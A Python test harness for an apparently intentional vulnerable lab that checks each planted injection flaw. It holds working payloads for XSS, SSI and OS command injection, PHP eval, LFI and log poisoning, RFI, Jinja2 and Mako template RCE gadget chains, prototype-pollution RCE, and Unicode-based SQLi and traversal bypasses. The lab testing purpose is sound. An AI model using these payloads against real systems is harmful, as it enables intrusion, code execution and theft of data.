"""WSTG probes for machine 05 - Injection: XSS, code and command execution.

Each probe asserts that the intentional weakness is demonstrably present:
payloads must appear in the dangerous context, or actual execution output /
a real cross-request effect must be observed. "HTTP 200" alone is never proof.

stdlib only; labhttp is already on sys.path.
"""
import base64
import html
import json
import re
import time
import urllib.parse
import uuid

from labhttp import get, post, request

FORM = {"Content-Type": "application/x-www-form-urlencoded"}
JSON_CT = {"Content-Type": "application/json"}

FLAG_SSTI = "WSTG-M05{ssti_jinja2_and_mako_rce}"
FLAG_ADMIN = "WSTG-M05{http_verb_tampering_auth_bypass}"
FLAG_HPP = "WSTG-M05{hpp_first_vs_last_occurrence}"
FLAG_HPP_BODY = "WSTG-M05{hpp_body_pollution_reaches_backend}"
FLAG_UNICODE = "WSTG-M05{unicode_nfkc_and_casefold_bypass}"
FLAG_PHP = "WSTG-M05{php_code_injection_and_file_inclusion}"
FLAG_PROTO = "WSTG-M05{prototype_pollution_cross_request}"
VAULT_SECRET = "vault-secret-7f3c9d21e8b4"


def _q(s):
    return urllib.parse.quote(s, safe="")


def _form(fields):
    return urllib.parse.urlencode(fields)


def _uid(r):
    """True when real `id` output reached the response."""
    return bool(re.search(r"uid=\d+\([^)]*\)\s+gid=\d+", r.text))


# --- WSTG-INJT-01: reflected XSS in three contexts ----------------------------

def injt_01(ctx):
    tag = uuid.uuid4().hex[:8]
    body_p = f"<img src=x onerror=alert('M05B{tag}')>"
    attr_p = f"\" autofocus onfocus=\"alert('M05A{tag}')"
    js_p = f"\";alert('M05J{tag}');//"

    rb = get(ctx.url("/search?q=" + _q(body_p)))
    ra = get(ctx.url("/search?q=" + _q(attr_p)))
    rj = get(ctx.url("/search?q=" + _q(js_p)))

    checks = {
        # unescaped tag inside the HTML body element
        "html_body": f"<h1>Results for {body_p}</h1>" in rb.text,
        # attribute value broken out of, new event handler attribute injected
        "html_attribute": f'value="{attr_p}"' in ra.text,
        # JS string literal terminated and a statement injected
        "js_string": f'var q = "{js_p}";' in rj.text,
        "no_encoding": "&lt;img" not in rb.text and "&#34;" not in ra.text,
    }
    ok = all(checks.values()) and all(r.status == 200 for r in (rb, ra, rj))
    return ok, f"reflected unescaped in 3 contexts: {checks}"


# --- WSTG-INJT-02: stored XSS --------------------------------------------------

def injt_02(ctx):
    tag = uuid.uuid4().hex[:8]
    payload = f"<img src=x onerror=alert('M05S{tag}')>"
    bio = f"\";alert('M05P{tag}');//"

    alice = ctx.session()
    alice.cookies["user"] = "alice"
    w = alice.post("/guestbook", data=_form({"author": "alice", "comment": payload}), headers=FORM)
    cid = w.json().get("id")

    # A DIFFERENT user, different cookie jar / connection, reads the stored page.
    bob = ctx.session()
    bob.cookies["user"] = "bob"
    r = bob.get("/guestbook")
    in_comment_div = f'<div class="comment" id="c{cid}" data-author="alice">' in r.text
    stored_body = in_comment_div and payload in r.text.split(f'id="c{cid}"', 1)[-1]

    # second stored sink: profile bio rendered into a JS string literal
    alice.post("/profile", data=_form({"bio": bio}), headers=FORM)
    rp = alice.get("/profile")
    stored_js = f'var bio = "{bio}";' in rp.text
    stored_attr = f'title="{bio}"' in rp.text

    # cleanup so the probe is idempotent
    alice.post("/guestbook/delete", data=_form({"id": cid}), headers=FORM)
    alice.post("/profile", data=_form({"bio": ""}), headers=FORM)
    gone = payload not in ctx.session().get("/guestbook").text

    ok = (w.status == 200 and stored_body and stored_js and stored_attr and gone)
    return ok, (f"alice wrote comment id={cid}; bob's GET serves payload intact={stored_body}; "
                f"profile JS context={stored_js}; attribute={stored_attr}; cleaned={gone}")


# --- WSTG-INJT-03: HTTP verb tampering -----------------------------------------

def injt_03(ctx):
    s = ctx.session()
    victim = "victim-" + uuid.uuid4().hex[:8]

    g = s.get("/admin/panel")
    p = s.post("/admin/panel")
    put = s.request("PUT", "/admin/panel")
    foo = s.request("FOO", "/admin/panel")
    head = s.request("HEAD", "/admin/panel")
    patch = s.request("PATCH", "/admin/users/delete?user=" + victim)

    # WAF-style filter inspects GET only: same payload via POST is not filtered.
    xss = "<script>alert('M05W')</script>"
    waf_get = get(ctx.url("/search?q=" + _q(xss)))
    waf_post = post(ctx.url("/search"), data=_form({"q": xss}), headers=FORM)

    checks = {
        "GET_denied": g.status == 403,
        "POST_denied": p.status == 403,
        "PUT_allowed": put.status == 200 and FLAG_ADMIN in put.text,
        "FOO_allowed": foo.status == 200 and FLAG_ADMIN in foo.text,
        "HEAD_allowed": head.status == 200 and head.header("X-Admin-Flag") == FLAG_ADMIN,
        "PATCH_deletes": patch.status == 200 and patch.json().get("deleted") == victim,
        "WAF_blocks_GET": waf_get.status == 403,
        "WAF_misses_POST": waf_post.status == 200 and xss in waf_post.text,
    }
    return all(checks.values()), (
        f"panel GET={g.status} POST={p.status} PUT={put.status} FOO={foo.status} HEAD={head.status}; "
        f"PATCH delete={patch.json().get('deleted')}; WAF GET={waf_get.status} POST={waf_post.status} "
        f"(script reflected={xss in waf_post.text})")


# --- WSTG-INJT-04: HTTP parameter pollution ------------------------------------

def injt_04(ctx):
    # Query-string pollution: nginx reads the FIRST role, Flask reads the LAST.
    single = get(ctx.url("/hpp/admin?role=admin"))
    polluted = get(ctx.url("/hpp/admin?role=user&role=admin"))
    echo = get(ctx.url("/hpp/echo?role=user&role=admin")).json()
    query_ok = (single.status == 403 and polluted.status == 200
                and FLAG_HPP in polluted.text
                and echo.get("first") == "user" and echo.get("last") == "admin")

    # Body pollution: gateway validates first occurrence, internal backend takes last.
    clean = post(ctx.url("/hpp/transfer"),
                 data="action=view&amount=1&from=alice&to=mallory", headers=FORM)
    evil = post(ctx.url("/hpp/transfer"),
                data="action=view&action=transfer&amount=1&amount=500&from=alice&to=mallory",
                headers=FORM)
    cj, ej = clean.json(), evil.json()
    body_ok = (clean.status == 200 and cj["backend"]["executed"] == "view"
               and evil.status == 200
               and ej["gateway_saw"]["action"] == "view"
               and ej["backend"]["executed"] == "transfer"
               and ej["backend"]["backend_saw"]["amount"] == "500"
               and FLAG_HPP_BODY in evil.text)

    ok = query_ok and body_ok
    return ok, (f"query: ?role=admin -> {single.status}, ?role=user&role=admin -> {polluted.status} "
                f"(front first={echo.get('first')}, backend last={echo.get('last')}); "
                f"body: gateway_saw={ej['gateway_saw'].get('action')}, "
                f"backend executed={ej['backend']['executed']} amount={ej['backend']['backend_saw'].get('amount')}, "
                f"impact={ej['backend'].get('impact')!r}")


# --- WSTG-INJT-08: SSI injection -----------------------------------------------

def injt_08(ctx):
    base = ctx.url("apache")

    def inject(directive):
        r = get(base + "/cgi-bin/greet.cgi?name=" + _q(directive))
        loc = r.header("Location", "")
        page = get(base + loc) if loc else None
        return r, loc, page

    exec_dir = '<!--#exec cmd="id" -->'
    r1, loc1, p1 = inject(exec_dir)
    echo_dir = '<!--#echo var="DOCUMENT_ROOT" -->'
    r2, loc2, p2 = inject(echo_dir)
    demo = get(base + "/demo.shtml")

    exec_ok = (r1.status == 302 and p1 is not None and p1.status == 200
               and _uid(p1) and exec_dir not in p1.text)
    echo_ok = (p2 is not None and "/usr/local/apache2/htdocs" in p2.text
               and echo_dir not in p2.text)
    demo_ok = _uid(demo) and "/usr/local/apache2/htdocs" in demo.text

    # cleanup the generated pages
    for loc in (loc1, loc2):
        if loc:
            get(base + "/cgi-bin/greet.cgi?purge=" + _q(loc.rsplit("/", 1)[-1]))

    ok = exec_ok and echo_ok and demo_ok
    snippet = re.search(r"uid=\d+\([^<]*", p1.text).group(0) if p1 and _uid(p1) else "none"
    return ok, (f"greet.cgi -> {loc1} serves executed SSI: {snippet!r}; "
                f"echo DOCUMENT_ROOT resolved={echo_ok}; static demo.shtml exec={demo_ok}")


# --- WSTG-INJT-11 (+11.1): code injection AND file inclusion --------------------

def injt_11(ctx):
    php = ctx.url("php")

    # 1. code injection: eval() reads a seeded flag file
    e = get(php + "/eval.php?expr=" + _q("echo file_get_contents('/flag.txt');"))
    code_flag = FLAG_PHP in e.text
    # 2. code injection: eval() runs an OS command
    e2 = get(php + "/eval.php?expr=" + _q("echo shell_exec('id');"))
    code_exec = _uid(e2)
    # 3. second sink: the callable itself is attacker-controlled
    c = get(php + "/call.php?fn=system&arg=" + _q("id"))
    call_exec = _uid(c)

    # 4. LFI: directory traversal out of the web root
    lfi = get(php + "/page.php?page=" + _q("../../../../../../etc/passwd"))
    lfi_ok = lfi.status == 200 and "root:x:0:0" in lfi.text
    # 5. LFI: php://filter source disclosure
    f = get(php + "/page.php?page=" + _q("php://filter/convert.base64-encode/resource=page.php"))
    m = re.search(r"<div id='content'>(.*?)</div>", f.text, re.S)
    src = ""
    if m:
        try:
            src = base64.b64decode(m.group(1).strip()).decode("utf-8", "replace")
        except Exception:
            src = ""
    filter_ok = "include($page)" in src
    # 6. LFI: log poisoning -> PHP in the User-Agent is executed by include()
    get(php + "/", headers={"User-Agent": "<?php echo 'POISON-OK:' . shell_exec('id'); ?>"})
    lp = get(php + "/page.php?page=" + _q("/var/log/apache2/lab-access.log"))
    poison_ok = "POISON-OK:uid=" in lp.text
    # 7. RFI: include() fetches PHP from an in-range host (never the internet)
    rfi = get(php + "/page.php?page=" + _q("http://rfi/shell.txt"))
    rfi_ok = rfi.status == 200 and "RFI-EXECUTED:uid=" in rfi.text

    checks = {
        "eval_flag": code_flag, "eval_exec": code_exec, "call_user_func": call_exec,
        "LFI_passwd": lfi_ok, "php_filter_source": filter_ok,
        "LFI_log_poison": poison_ok, "RFI_in_range": rfi_ok,
    }
    ok = all(checks.values())
    return ok, (f"code injection: eval flag={code_flag} eval id={code_exec} call_user_func id={call_exec}; "
                f"LFI: /etc/passwd={lfi_ok} php://filter source={filter_ok} log poisoning={poison_ok}; "
                f"RFI http://rfi/shell.txt executed={rfi_ok}")


# --- WSTG-INJT-12: command injection --------------------------------------------

def injt_12(ctx):
    tag = uuid.uuid4().hex[:8]
    bt_marker = "M05BT" + tag
    ss_marker = "M05SS" + tag
    # `id` inside a command substitution is expanded by the shell and ping then
    # echoes the expanded text in its error, so id's output is the proof.
    id_fragment = re.compile(r"(?:uid|gid|groups)=\d+\(")
    variants = {
        "semicolon": ("127.0.0.1; id", lambda r: _uid(r)),
        "pipe": ("127.0.0.1 | id", lambda r: _uid(r)),
        "backticks": ("127.0.0.1 `id`", lambda r: bool(id_fragment.search(r.text))),
        "subshell": ("127.0.0.1 $(id)", lambda r: bool(id_fragment.search(r.text))),
        "backtick_marker": (f"127.0.0.1 `echo {bt_marker}`", lambda r: bt_marker in r.text),
        "subshell_marker": (f"127.0.0.1 $(echo {ss_marker})", lambda r: ss_marker in r.text),
    }
    out = {}
    for name, (payload, check) in variants.items():
        r = get(ctx.url("/net/ping?host=" + _q(payload)))
        out[name] = check(r)
    php = get(ctx.url("php") + "/cmd.php?host=" + _q("127.0.0.1; id"))
    out["php_shell_exec"] = _uid(php)

    # blind / time-based variant: output is discarded, only timing leaks
    t0 = time.time()
    base_r = get(ctx.url("/net/lookup?host=localhost"))
    base_t = time.time() - t0
    t0 = time.time()
    inj_r = get(ctx.url("/net/lookup?host=" + _q("localhost; sleep 5")), timeout=40)
    inj_t = time.time() - t0
    blind_ok = base_r.status == 200 and inj_r.status == 200 and (inj_t - base_t) >= 4.0

    ok = all(out.values()) and blind_ok
    return ok, (f"command output for {out}; blind '; sleep 5' baseline={base_t:.2f}s "
                f"injected={inj_t:.2f}s delta={inj_t - base_t:.2f}s")


# --- WSTG-INJT-18: server-side template injection -------------------------------

def injt_18(ctx):
    j = get(ctx.url("/tpl/jinja?name=" + _q("{{7*7}}")))
    jinja_math = "<h1>Hello 49</h1>" in j.text

    # Jinja2 __class__.__mro__ gadget chain: enumerate object's subclasses,
    # locate os._wrap_close and call popen through its __init__.__globals__.
    lst = get(ctx.url("/tpl/jinja?name=" + _q("{{ ''.__class__.__mro__[1].__subclasses__() }}")))
    names = re.findall(r"<class '([^']+)'>", html.unescape(lst.text))
    idx = next((i for i, n in enumerate(names) if n == "os._wrap_close"), None)
    jinja_rce = False
    if idx is not None:
        gadget = ("{{ ''.__class__.__mro__[1].__subclasses__()[%d]"
                  ".__init__.__globals__['popen']('cat /flag.txt').read() }}" % idx)
        r = get(ctx.url("/tpl/jinja?name=" + _q(gadget)))
        jinja_rce = FLAG_SSTI in r.text

    m = get(ctx.url("/tpl/mako?name=" + _q("${7*7}")))
    mako_math = "<h1>Hello 49</h1>" in m.text
    mp = "<% import os %>${os.popen('cat /flag.txt').read()}"
    mr = get(ctx.url("/tpl/mako?name=" + _q(mp)))
    mako_rce = FLAG_SSTI in mr.text

    ok = jinja_math and jinja_rce and mako_math and mako_rce
    return ok, (f"Jinja2 {{{{7*7}}}}->49={jinja_math}; mro[1].__subclasses__()[{idx}] "
                f"os._wrap_close popen flag={jinja_rce}; Mako ${{7*7}}->49={mako_math}; "
                f"Mako os.popen flag={mako_rce}")


# --- WSTG-INJT-22: prototype pollution -------------------------------------------

def injt_22(ctx):
    node = ctx.url("node")

    def reset():
        post(node + "/reset", data={}, headers=JSON_CT)

    reset()
    before = get(node + "/admin")
    prof_before = get(node + "/profile").json()

    # pollute through __proto__ on a per-request merge target
    poll = post(node + "/settings", data={"__proto__": {"isAdmin": True, "role": "admin", "theme": "dark"}})
    after = get(node + "/admin")                 # brand-new request/connection
    prof_after = get(node + "/profile").json()   # unrelated endpoint
    proto_ok = (before.status == 403 and after.status == 200 and FLAG_PROTO in after.text
                and prof_before.get("isAdmin") is False and prof_after.get("isAdmin") is True
                and prof_after.get("theme") == "dark"
                and poll.json().get("global_isAdmin") is True)

    # the constructor.prototype path pollutes too
    reset()
    post(node + "/settings", data={"constructor": {"prototype": {"isAdmin": True}}})
    ctor_ok = get(node + "/admin").status == 200

    # gadget: polluted ejs outputFunctionName turns a later render into RCE
    reset()
    render_before = post(node + "/render", data={"message": "hi"})
    gadget = ("_tmp1;return global.process.getBuiltinModule('child_process')"
              ".execSync('id').toString();var _tmp2")
    post(node + "/settings", data={"__proto__": {"outputFunctionName": gadget}})
    render_after = post(node + "/render", data={"message": "hi"})
    rce_ok = ("uid=" not in render_before.text) and _uid(render_after)

    reset()
    restored = get(node + "/admin")

    ok = proto_ok and ctor_ok and rce_ok and restored.status == 403
    return ok, (f"/admin before={before.status} after pollution={after.status} (flag={FLAG_PROTO in after.text}); "
                f"unrelated /profile isAdmin {prof_before.get('isAdmin')}->{prof_after.get('isAdmin')}, "
                f"theme={prof_after.get('theme')!r}; constructor.prototype path={ctor_ok}; "
                f"ejs render RCE={rce_ok}; after reset /admin={restored.status}")


# --- WSTG-INJT-25: Unicode normalization / case mapping ---------------------------

def injt_25(ctx):
    # 1. path blacklist runs before NFKC: fullwidth dots/slashes fold to ../
    blocked = get(ctx.url("/unicode/download?file=" + _q("../../../etc/passwd")))
    fw_path = "．．／．．／．．／ｅｔｃ／ｐａｓｓｗｄ"
    bypass = get(ctx.url("/unicode/download?file=" + _q(fw_path)))
    trav_ok = blocked.status == 403 and bypass.status == 200 and "root:x:0:0" in bypass.text

    # 2. authorisation equality check runs before NFKC: fullwidth "admin"
    denied = get(ctx.url("/unicode/whoami?user=admin"))
    fw_admin = get(ctx.url("/unicode/whoami?user=" + _q("ａｄｍｉｎ")))
    authz_ok = (denied.status == 403 and fw_admin.status == 200
                and fw_admin.json().get("role") == "admin" and FLAG_UNICODE in fw_admin.text)

    # 3. SQL keyword filter runs before NFKC+casefold: U+017F long-s -> s,
    #    fullwidth UNION -> union, and the folded keywords reach the SQL sink.
    sql_blocked = get(ctx.url("/unicode/search?q=" + _q("x' UNION SELECT name,secret FROM vault -- ")))
    payload = "x' ＵＮＩＯＮ ſelect name,secret from vault -- "
    sqli = get(ctx.url("/unicode/search?q=" + _q(payload)))
    sj = sqli.json() if sqli.status == 200 else {}
    sql_ok = (sql_blocked.status == 403 and sqli.status == 200
              and "union select" in sj.get("normalized", "")
              and VAULT_SECRET in sqli.text)

    # 4. XSS filter runs before NFKC: fullwidth <script> becomes a real tag
    x_blocked = get(ctx.url("/unicode/reflect?text=" + _q("<script>alert(1)</script>")))
    x_fw = get(ctx.url("/unicode/reflect?text=" + _q("＜script＞alert('M05U')＜/script＞")))
    xss_ok = x_blocked.status == 403 and "<script>alert('M05U')</script>" in x_fw.text

    checks = {"NFKC_path_traversal": trav_ok, "NFKC_authz_bypass": authz_ok,
              "casefold_SQL_keyword": sql_ok, "NFKC_script_tag": xss_ok}
    ok = all(checks.values())
    return ok, (f"{checks}; ascii traversal={blocked.status} fullwidth={bypass.status}; "
                f"admin={denied.status} ａｄｍｉｎ={fw_admin.status}; "
                f"SQL filter={sql_blocked.status} ſelect bypass={sqli.status} "
                f"normalized={sj.get('normalized', '')!r}; vault rows={sj.get('rows')}")